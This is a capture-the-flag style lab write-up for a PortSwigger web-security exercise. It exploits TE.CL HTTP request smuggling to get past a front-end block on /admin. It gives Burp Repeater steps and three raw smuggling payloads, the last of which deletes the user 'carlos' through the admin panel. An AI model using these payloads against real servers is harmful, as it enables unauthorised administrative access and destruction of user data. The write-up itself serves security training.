# Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

## Description

[This lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl) involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at `/admin`, but the front-end server blocks access to it.

## Reproduction and proof of concept

1. Try to visit ``/admin`` and observe that the request is blocked.
2. In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
3. Using Burp Repeater, issue the following request twice:

```text
POST / HTTP/1.1
Host: lab-id.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

60
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

4. Observe that the merged request to ``/admin`` was rejected due to not using the header ``Host: localhost``.
5. Issue the following request twice:

```text
POST / HTTP/1.1
Host: lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

6. Observe that you can now access the admin panel.
7. Using the previous response as a reference, change the smuggled request URL to delete the user ``carlos``:

```text
POST / HTTP/1.1
Host: lab-id.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

## Exploitability

An attacker will need to smuggle HTTP requests to access the ``/admin`` page, then delete a user.
